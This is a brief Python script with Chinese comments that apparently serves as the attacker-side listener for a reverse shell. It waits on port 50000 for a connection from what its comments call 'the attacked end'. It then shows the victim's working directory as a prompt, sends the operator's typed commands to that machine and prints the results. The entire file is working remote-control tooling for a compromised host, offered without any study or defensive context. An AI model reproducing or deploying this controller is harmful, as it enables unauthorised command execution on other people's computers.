import socket
import time
server=("0.0.0.0",50000) #本地监听地址与端口
s=socket.socket()
s.bind(server)
s.listen(5)
con,addr=s.accept()
print(addr,"已经接入!")
while 1:
    #接收来自被攻击端的所在目录
    dir=con.recv(1024).decode()
    cmd=input(dir+":").strip()
    con.send(cmd.encode())
    if cmd=="exit":
        break
    result=con.recv(65365)
    print(result.decode())
    time.sleep(1)
s.close()
print("退出!")